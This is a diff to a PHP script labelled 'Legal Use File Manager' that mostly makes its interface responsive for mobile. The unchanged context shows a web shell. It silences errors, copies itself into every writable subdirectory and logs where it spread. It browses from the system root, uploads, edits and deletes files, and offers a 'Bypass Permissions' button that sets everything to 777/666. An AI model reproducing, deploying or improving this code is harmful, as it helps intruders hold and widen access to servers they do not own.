@@ -1,7 +1,7 @@
 <?php
 /**
  * Legal Use File Manager
- * Enhanced with English UI, Dark Mode, and improved navigation
+ * Fully Responsive with Dark Mode & Mobile-Friendly Navigation
  */
 error_reporting(0);
 ini_set('display_errors', 0);
@@ -34,7 +34,6 @@ if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
     $mevcutDosya = __FILE__;
     $mevcutIsim = basename($mevcutDosya);
     
-    // Traverse all subdirectories
     $dizinler = array($hedefKok);
     $tumDizinler = array();
     
@@ -58,7 +57,6 @@ if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
         if ($i > 100) break;
     }
     
-    // Copy file
     foreach ($tumDizinler as $dizin) {
         if (!is_writable($dizin)) continue;
         $hedefYol = $dizin . DIRECTORY_SEPARATOR . $mevcutIsim;
@@ -80,7 +78,6 @@ if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
         }
     }
     
-    // Save to JSON
     $data = array(
         'kopyalandi' => true,
         'tarih' => date('Y-m-d H:i:s'),
@@ -91,7 +88,6 @@ if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
     @file_put_contents($jsonDosyasi, json_encode($data, JSON_PRETTY_PRINT));
     @chmod($jsonDosyasi, 0666);
     
-    // Download report
     $rapor = "=== COPIED FILE PATHS ===\n\n";
     $rapor .= "Date: " . date('Y-m-d H:i:s') . "\n";
     $rapor .= "Source File: " . __FILE__ . "\n\n";
@@ -139,6 +135,7 @@ if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
             justify-content: center;
             min-height: 100vh;
             font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 16px;
         }
         .login-card {
             background: #1a1f2b;
@@ -168,7 +165,7 @@ if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
             border: 1px solid #2e374b;
             background: #0f131c;
             color: #e9edf5;
-            font-size: 15px;
+            font-size: 16px;
             transition: 0.2s;
             outline: none;
         }
@@ -212,6 +209,10 @@ if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
         }
         .login-footer span {
             color: #5b7cfa;
+        }
+        @media (max-width: 480px) {
+            .login-card { padding: 24px 20px; }
+            .login-card h3 { font-size: 20px; }
         }
     </style>
 </head>
@@ -411,7 +412,6 @@ class FileManager {
         return isset($map[$ext]) ? $map[$ext] : 'bi-file-earmark';
     }
     
-    // Build interactive breadcrumb with links
     public function getBreadcrumb() {
         $dir = $this->currentDir;
         $parts = explode(DIRECTORY_SEPARATOR, $dir);
@@ -449,7 +449,7 @@ if (isset($_GET['edit'])) {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>File Manager</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
@@ -479,7 +479,7 @@ if (isset($_GET['edit'])) {
             background: var(--bg-body);
             color: var(--text-primary);
             font-family: 'Inter', system-ui, sans-serif;
-            padding: 16px;
+            padding: 12px;
             min-height: 100vh;
         }
         .fm-container {
@@ -491,17 +491,20 @@ if (isset($_GET['edit'])) {
             border: 1px solid var(--border-color);
             overflow: hidden;
         }
+        /* Sidebar - collapsible on mobile */
         .fm-sidebar {
             background: var(--bg-elevated);
-            padding: 20px 16px;
-            min-height: 80vh;
+            padding: 16px;
             border-right: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            height: 100%;
+            overflow-y: auto;
         }
         .fm-sidebar .nav-btn {
             display: block;
             width: 100%;
-            padding: 10px 14px;
-            margin-bottom: 8px;
+            padding: 12px 14px;
+            margin-bottom: 6px;
             border-radius: 8px;
             border: none;
             background: transparent;
@@ -509,9 +512,9 @@ if (isset($_GET['edit'])) {
             text-align: left;
             transition: var(--transition);
             font-weight: 500;
-            font-size: 14px;
+            font-size: 15px;
         }
-        .fm-sidebar .nav-btn i { margin-right: 10px; font-size: 1.1rem; }
+        .fm-sidebar .nav-btn i { margin-right: 12px; font-size: 1.2rem; width: 1.4rem; text-align: center; }
         .fm-sidebar .nav-btn:hover {
             background: var(--bg-hover);
             color: var(--text-primary);
@@ -520,26 +523,27 @@ if (isset($_GET['edit'])) {
             background: var(--accent);
             color: #fff;
         }
-        .fm-sidebar hr { border-color: var(--border-color); margin: 18px 0; }
+        .fm-sidebar hr { border-color: var(--border-color); margin: 14px 0; }
         .fm-sidebar .folder-list a {
             display: flex;
             align-items: center;
-            padding: 8px 12px;
+            padding: 10px 12px;
             border-radius: 6px;
             color: var(--text-secondary);
             text-decoration: none;
             transition: var(--transition);
-            font-size: 14px;
+            font-size: 15px;
+            margin-bottom: 2px;
         }
-        .fm-sidebar .folder-list a i { margin-right: 10px; color: var(--warning); font-size: 1.1rem; }
+        .fm-sidebar .folder-list a i { margin-right: 12px; color: var(--warning); font-size: 1.2rem; width: 1.4rem; text-align: center; }
         .fm-sidebar .folder-list a:hover {
             background: var(--bg-hover);
             color: var(--text-primary);
         }
         .fm-sidebar .folder-list .empty {
             color: var(--text-muted);
-            font-size: 13px;
-            padding: 8px 12px;
+            font-size: 14px;
+            padding: 10px 12px;
         }
         .sidebar-title {
             font-size: 13px;
@@ -547,27 +551,46 @@ if (isset($_GET['edit'])) {
             text-transform: uppercase;
             letter-spacing: 0.5px;
             color: var(--text-muted);
-            margin-bottom: 12px;
+            margin-bottom: 10px;
+        }
+        /* Mobile toggle button */
+        .sidebar-toggle {
+            display: none;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 1.5rem;
+            line-height: 1;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .sidebar-toggle:hover {
+            background: var(--bg-hover);
         }
         .fm-content {
-            padding: 24px 28px;
+            padding: 16px 20px;
             background: var(--bg-body);
         }
         .fm-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 10px;
         }
         .fm-header h5 {
             font-weight: 600;
-            font-size: 20px;
+            font-size: 1.1rem;
             margin: 0;
             color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .fm-header h5 i { color: var(--accent); margin-right: 8px; }
+        .fm-header h5 i { color: var(--accent); font-size: 1.3rem; }
         .fm-header .btn-logout {
             background: transparent;
             border: 1px solid var(--border-color);
@@ -575,6 +598,7 @@ if (isset($_GET['edit'])) {
             padding: 8px 16px;
             border-radius: 8px;
             transition: var(--transition);
+            font-size: 0.9rem;
         }
         .fm-header .btn-logout:hover {
             background: var(--danger);
@@ -583,9 +607,9 @@ if (isset($_GET['edit'])) {
         }
         .fm-breadcrumb {
             background: var(--bg-elevated);
-            padding: 12px 18px;
+            padding: 10px 14px;
             border-radius: 8px;
-            margin-bottom: 22px;
+            margin-bottom: 18px;
             border: 1px solid var(--border-color);
             display: flex;
             align-items: center;
@@ -593,13 +617,14 @@ if (isset($_GET['edit'])) {
             gap: 4px;
             font-size: 14px;
             color: var(--text-secondary);
+            word-break: break-all;
         }
         .fm-breadcrumb a { color: var(--accent); text-decoration: none; }
         .fm-breadcrumb a:hover { text-decoration: underline; }
         .fm-alert {
-            padding: 12px 18px;
+            padding: 12px 16px;
             border-radius: 8px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             border-left: 5px solid;
             font-size: 14px;
             background: var(--bg-elevated);
@@ -611,10 +636,10 @@ if (isset($_GET['edit'])) {
         .fm-toolbar {
             display: flex;
             flex-wrap: wrap;
-            gap: 12px;
-            margin-bottom: 24px;
+            gap: 10px;
+            margin-bottom: 20px;
             background: var(--bg-elevated);
-            padding: 16px 18px;
+            padding: 14px 16px;
             border-radius: var(--radius);
             border: 1px solid var(--border-color);
             align-items: center;
@@ -624,9 +649,11 @@ if (isset($_GET['edit'])) {
             border: 1px solid var(--border-color);
             color: var(--text-primary);
             border-radius: 8px;
-            padding: 8px 14px;
-            font-size: 14px;
+            padding: 10px 14px;
+            font-size: 15px;
             transition: var(--transition);
+            width: 100%;
+            min-width: 120px;
         }
         .fm-toolbar .form-control:focus {
             border-color: var(--accent);
@@ -635,27 +662,28 @@ if (isset($_GET['edit'])) {
         .fm-toolbar .form-control::placeholder { color: var(--text-muted); }
         .fm-toolbar .btn {
             border-radius: 8px;
-            padding: 8px 18px;
+            padding: 10px 16px;
             font-weight: 500;
             font-size: 14px;
             border: none;
             transition: var(--transition);
+            white-space: nowrap;
         }
         .btn-primary { background: var(--accent); color: #fff; }
-        .btn-primary:hover { background: var(--accent-hover); transform: scale(1.02); }
+        .btn-primary:hover { background: var(--accent-hover); }
         .btn-success { background: var(--success); color: #0b0e14; }
-        .btn-success:hover { background: #3dcb92; transform: scale(1.02); }
+        .btn-success:hover { background: #3dcb92; }
         .btn-warning { background: var(--warning); color: #0b0e14; }
-        .btn-warning:hover { background: #f0a83a; transform: scale(1.02); }
+        .btn-warning:hover { background: #f0a83a; }
         .btn-secondary { background: var(--bg-hover); color: var(--text-secondary); }
         .btn-secondary:hover { background: #38425a; color: var(--text-primary); }
         .btn-danger { background: var(--danger); color: #fff; }
-        .btn-danger:hover { background: #e85555; transform: scale(1.02); }
-        .btn-sm { padding: 4px 10px; font-size: 13px; }
+        .btn-danger:hover { background: #e85555; }
+        .btn-sm { padding: 6px 12px; font-size: 13px; }
         .fm-table {
             background: var(--bg-elevated);
             border-radius: var(--radius);
-            overflow: hidden;
+            overflow-x: auto;
             border: 1px solid var(--border-color);
         }
         .fm-table table {
@@ -663,21 +691,23 @@ if (isset($_GET['edit'])) {
             border-collapse: collapse;
             color: var(--text-primary);
             font-size: 14px;
+            min-width: 600px;
         }
         .fm-table thead {
             background: var(--bg-hover);
             border-bottom: 1px solid var(--border-color);
         }
         .fm-table th {
-            padding: 14px 16px;
+            padding: 12px 12px;
             font-weight: 600;
             color: var(--text-secondary);
             text-transform: uppercase;
             font-size: 12px;
             letter-spacing: 0.3px;
+            text-align: left;
         }
         .fm-table td {
-            padding: 12px 16px;
+            padding: 12px 12px;
             border-bottom: 1px solid var(--border-color);
             vertical-align: middle;
         }
@@ -688,11 +718,18 @@ if (isset($_GET['edit'])) {
             font-weight: 500;
             color: var(--text-primary);
             text-decoration: none;
+            display: inline-flex;
+            align-items: center;
         }
         .fm-table .file-name:hover { color: var(--accent); }
         .fm-table .file-size { color: var(--text-muted); font-size: 13px; }
         .fm-table .file-perms { font-family: monospace; font-size: 13px; color: var(--text-secondary); }
-        .fm-table .actions { display: flex; gap: 6px; justify-content: flex-end; }
+        .fm-table .actions {
+            display: flex;
+            gap: 6px;
+            justify-content: flex-end;
+            flex-wrap: wrap;
+        }
         .fm-editor {
             background: var(--bg-elevated);
             border-radius: var(--radius);
@@ -701,21 +738,23 @@ if (isset($_GET['edit'])) {
         }
         .fm-editor .editor-header {
             background: var(--bg-hover);
-            padding: 12px 18px;
+            padding: 12px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid var(--border-color);
+            flex-wrap: wrap;
+            gap: 8px;
         }
-        .fm-editor .editor-header span { font-weight: 500; }
+        .fm-editor .editor-header span { font-weight: 500; font-size: 15px; }
         .fm-editor .editor-header span i { margin-right: 8px; color: var(--accent); }
         .fm-editor textarea {
             width: 100%;
-            min-height: 500px;
+            min-height: 400px;
             background: #0d111a;
             color: #e9edf5;
             border: none;
-            padding: 20px;
+            padding: 16px;
             font-family: 'Fira Code', 'JetBrains Mono', monospace;
             font-size: 14px;
             line-height: 1.7;
@@ -723,31 +762,123 @@ if (isset($_GET['edit'])) {
             outline: none;
         }
         .fm-editor textarea:focus { box-shadow: inset 0 0 0 1px var(--accent); }
-        @media (max-width: 768px) {
-            .fm-sidebar { min-height: auto; border-right: none; border-bottom: 1px solid var(--border-color); }
-            .fm-content { padding: 16px; }
-            .fm-toolbar { flex-direction: column; }
-            .fm-toolbar .d-flex { width: 100%; }
-            .fm-table table { font-size: 13px; }
-            .fm-table th, .fm-table td { padding: 10px 12px; }
-            .fm-header { flex-direction: column; align-items: stretch; }
-        }
-        ::-webkit-scrollbar { width: 8px; height: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-body); }
-        ::-webkit-scrollbar-thumb { background: var(--bg-hover); border-radius: 8px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
         .text-muted-custom { color: var(--text-muted); }
         .gap-2 { gap: 0.5rem; }
         .flex-wrap { flex-wrap: wrap; }
-        .go-to-form .form-control { width: 220px; }
-        @media (max-width: 600px) { .go-to-form .form-control { width: 140px; } }
+        .d-flex { display: flex; }
+        .align-items-center { align-items: center; }
+        .w-100 { width: 100%; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            body { padding: 8px; }
+            .fm-content { padding: 12px 14px; }
+            .fm-sidebar {
+                display: none;
+                border-right: none;
+                border-bottom: 1px solid var(--border-color);
+                padding: 12px;
+                max-height: 70vh;
+                overflow-y: auto;
+            }
+            .fm-sidebar.show {
+                display: block;
+            }
+            .sidebar-toggle {
+                display: inline-block;
+            }
+            .fm-header h5 { font-size: 1rem; }
+            .fm-toolbar {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .fm-toolbar .d-flex {
+                flex-direction: column;
+                width: 100%;
+            }
+            .fm-toolbar .form-control {
+                width: 100% !important;
+                max-width: 100% !important;
+                min-width: unset;
+            }
+            .fm-toolbar .btn {
+                width: 100%;
+                justify-content: center;
+            }
+            .fm-toolbar .go-to-form {
+                flex-direction: row;
+                width: 100%;
+            }
+            .fm-toolbar .go-to-form .form-control {
+                flex: 1;
+            }
+            .fm-toolbar .go-to-form .btn {
+                width: auto;
+                flex-shrink: 0;
+            }
+            .fm-breadcrumb {
+                font-size: 13px;
+                padding: 8px 12px;
+            }
+            .fm-table table {
+                font-size: 13px;
+                min-width: 480px;
+            }
+            .fm-table th, .fm-table td {
+                padding: 10px 8px;
+            }
+            .fm-table .actions .btn-sm {
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            .fm-editor textarea {
+                min-height: 300px;
+                font-size: 13px;
+                padding: 12px;
+            }
+            .fm-header .btn-logout {
+                padding: 6px 12px;
+                font-size: 0.85rem;
+            }
+        }
+        @media (max-width: 480px) {
+            .fm-table table {
+                min-width: 360px;
+                font-size: 12px;
+            }
+            .fm-table th, .fm-table td {
+                padding: 8px 6px;
+            }
+            .fm-table .file-icon { font-size: 1rem; margin-right: 6px; }
+            .fm-sidebar .nav-btn { font-size: 14px; padding: 10px 12px; }
+            .fm-sidebar .folder-list a { font-size: 14px; padding: 8px 10px; }
+        }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-body); }
+        ::-webkit-scrollbar-thumb { background: var(--bg-hover); border-radius: 8px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
     </style>
 </head>
 <body>
 <div class="fm-container">
+    <!-- Header with toggle -->
+    <div class="fm-header" style="padding:12px 16px 0 16px; margin-bottom:0; border-bottom:1px solid var(--border-color);">
+        <div style="display:flex; align-items:center; gap:12px;">
+            <button class="sidebar-toggle" id="sidebarToggle" aria-label="Toggle navigation">
+                <i class="bi bi-list"></i>
+            </button>
+            <h5><i class="bi bi-terminal"></i> File Manager</h5>
+        </div>
+        <form method="post" class="d-inline">
+            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
+            <input type="hidden" name="action" value="logout">
+            <button class="btn-logout"><i class="bi bi-power"></i> Logout</button>
+        </form>
+    </div>
+
     <div class="row g-0">
         <!-- Sidebar -->
-        <div class="col-md-3 fm-sidebar">
+        <div class="col-md-3 fm-sidebar" id="sidebar">
             <div class="d-grid gap-2 mb-3">
                 <a href="?dir=<?php echo urlencode($fm->getSystemRoot()); ?>" class="nav-btn"><i class="bi bi-hdd"></i> Root</a>
                 <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="nav-btn"><i class="bi bi-house"></i> Home</a>
@@ -768,10 +899,10 @@ if (isset($_GET['edit'])) {
             </div>
             <hr>
             <div style="margin-top: 12px;">
-                <form method="post" class="d-inline">
+                <form method="post" class="d-inline w-100">
                     <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                     <input type="hidden" name="action" value="bypass_permissions">
-                    <button class="nav-btn" style="color:var(--warning);" onclick="return confirm('Change all file/folder permissions to 777/666?')">
+                    <button class="nav-btn" style="color:var(--warning); width:100%;" onclick="return confirm('Change all file/folder permissions to 777/666?')">
                         <i class="bi bi-unlock"></i> Bypass Permissions
                     </button>
                 </form>
@@ -780,17 +911,7 @@ if (isset($_GET['edit'])) {
 
         <!-- Content -->
         <div class="col-md-9 fm-content">
-            <!-- Header -->
-            <div class="fm-header">
-                <h5><i class="bi bi-terminal"></i> File Manager</h5>
-                <form method="post" class="d-inline">
-                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
-                    <input type="hidden" name="action" value="logout">
-                    <button class="btn-logout"><i class="bi bi-power"></i> Logout</button>
-                </form>
-            </div>
-
-            <!-- Breadcrumb with links -->
+            <!-- Breadcrumb -->
             <div class="fm-breadcrumb">
                 <?php echo $fm->getBreadcrumb(); ?>
             </div>
@@ -817,7 +938,7 @@ if (isset($_GET['edit'])) {
                         <input type="hidden" name="action" value="save_edit">
                         <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                         <textarea name="content"><?php echo htmlspecialchars($editContent); ?></textarea>
-                        <div style="padding: 12px 18px; background:var(--bg-hover); border-top:1px solid var(--border-color); text-align:right;">
+                        <div style="padding: 12px 16px; background:var(--bg-hover); border-top:1px solid var(--border-color); text-align:right;">
                             <button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Save</button>
                         </div>
                     </form>
@@ -825,26 +946,25 @@ if (isset($_GET['edit'])) {
             <?php else: ?>
                 <!-- Toolbar -->
                 <div class="fm-toolbar">
-                    <div class="d-flex flex-wrap gap-2 flex-grow-1">
-                        <form method="post" enctype="multipart/form-data" class="d-flex gap-2 flex-wrap">
+                    <div class="d-flex flex-wrap gap-2 w-100">
+                        <form method="post" enctype="multipart/form-data" class="d-flex gap-2 flex-wrap w-100">
                             <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                             <input type="hidden" name="action" value="upload">
-                            <input type="file" name="file" class="form-control" style="max-width:220px;" required>
-                            <button class="btn btn-primary"><i class="bi bi-upload"></i> Upload</button>
+                            <input type="file" name="file" class="form-control" style="flex:1; min-width:120px;" required>
+                            <button class="btn btn-primary" style="flex-shrink:0;"><i class="bi bi-upload"></i> Upload</button>
                         </form>
-                        <form method="post" class="d-flex gap-2 flex-wrap">
+                        <form method="post" class="d-flex gap-2 flex-wrap w-100">
                             <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                             <input type="hidden" name="action" value="create_folder">
-                            <input type="text" name="folder_name" class="form-control" placeholder="New folder name" style="max-width:180px;" required>
-                            <button class="btn btn-success"><i class="bi bi-folder-plus"></i> Create</button>
+                            <input type="text" name="folder_name" class="form-control" placeholder="New folder name" style="flex:1; min-width:120px;" required>
+                            <button class="btn btn-success" style="flex-shrink:0;"><i class="bi bi-folder-plus"></i> Create</button>
                         </form>
                     </div>
-                    <!-- Go to path form -->
-                    <form method="post" class="d-flex gap-2 go-to-form">
+                    <form method="post" class="d-flex gap-2 go-to-form w-100" style="margin-top:4px;">
                         <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                         <input type="hidden" name="action" value="go_to_path">
-                        <input type="text" name="path" class="form-control" placeholder="Enter path" style="min-width:160px;" required>
-                        <button class="btn btn-secondary"><i class="bi bi-arrow-right"></i> Go</button>
+                        <input type="text" name="path" class="form-control" placeholder="Enter path" required>
+                        <button class="btn btn-secondary" style="flex-shrink:0;"><i class="bi bi-arrow-right"></i> Go</button>
                     </form>
                 </div>
 
@@ -923,6 +1043,30 @@ if (isset($_GET['edit'])) {
 </form>
 
 <script>
+// Toggle sidebar on mobile
+document.getElementById('sidebarToggle').addEventListener('click', function(e) {
+    e.stopPropagation();
+    document.getElementById('sidebar').classList.toggle('show');
+});
+// Close sidebar when a folder link is clicked (mobile)
+document.querySelectorAll('.fm-sidebar .folder-list a, .fm-sidebar .nav-btn').forEach(function(el) {
+    el.addEventListener('click', function() {
+        if (window.innerWidth <= 768) {
+            document.getElementById('sidebar').classList.remove('show');
+        }
+    });
+});
+// Close sidebar if clicking outside (optional)
+document.addEventListener('click', function(e) {
+    const sidebar = document.getElementById('sidebar');
+    const toggle = document.getElementById('sidebarToggle');
+    if (window.innerWidth <= 768 && sidebar.classList.contains('show')) {
+        if (!sidebar.contains(e.target) && !toggle.contains(e.target)) {
+            sidebar.classList.remove('show');
+        }
+    }
+});
+
 function del(name) {
     if(confirm('Delete "' + name + '" permanently?')) {
         document.getElementById('f_action').value = 'delete';
